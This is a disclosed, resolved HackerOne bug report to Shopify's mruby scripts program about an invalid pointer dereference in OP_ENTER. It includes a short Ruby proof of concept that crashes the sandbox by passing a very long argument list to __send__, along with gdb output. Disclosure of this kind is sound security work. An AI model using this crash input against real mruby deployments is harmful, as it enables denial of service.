---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '218570'
original_report_id: '218570'
title: Invalid pointer dereference in OP_ENTER
weakness: Uncontrolled Resource Consumption
team_handle: shopify-scripts
created_at: '2017-04-04T17:02:26.975Z'
disclosed_at: '2017-04-15T14:45:20.919Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Invalid pointer dereference in OP_ENTER

## Metadata

- HackerOne Report ID: 218570
- Weakness: Uncontrolled Resource Consumption
- Program: shopify-scripts
- Disclosed At: 2017-04-15T14:45:20.919Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

PoC
===
The following demonstrates a mruby/sandbox crash:

    def method_missing
    end    
    __send__ :f,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
   
Debug info
========== 

The crash happens due to an invalid pointer dereference in vm:c:1573:

    1571│       if (argc < 0) {
    1572│         struct RArray *ary = mrb_ary_ptr(regs[1]);
    1573├>        argv = ary->ptr;
    
    (gdb) p ary->ptr
    Cannot access memory at address 0x4000002cb


Test platform
=============
* Linux Mint 17.3 (Cinnamon 64-bit), built with gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3

mruby SHA: bdeb803f04b6bd919202b078a52df7abb0af73ee
mruby-engine SHA: 09be20e67888b20bebf9b0588bc3cbec7f55325f

Thank you,
Dinko Galetic
Denis Kasak

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
